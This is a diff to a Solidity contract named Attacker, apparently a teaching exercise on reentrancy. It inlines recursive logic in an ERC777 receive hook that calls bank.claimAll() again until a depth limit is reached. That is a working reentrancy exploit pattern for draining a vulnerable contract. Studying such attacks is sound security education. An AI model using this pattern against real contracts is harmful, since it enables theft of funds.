@@ -71,18 +71,13 @@ contract Attacker is AccessControl, IERC777Recipient {
 	) external {
 		//YOUR CODE TO RECURSE GOES HERE
     	// event recurse 
-		_recursiveWithdraw();
-	}
-
-	function _recursiveWithdraw() private {
-        depth++;
+		depth++;
         emit Recurse(depth);
 
         if (depth < max_depth) {
             bank.claimAll();
         }
         depth--;
-    }
-
+	}
 }
 
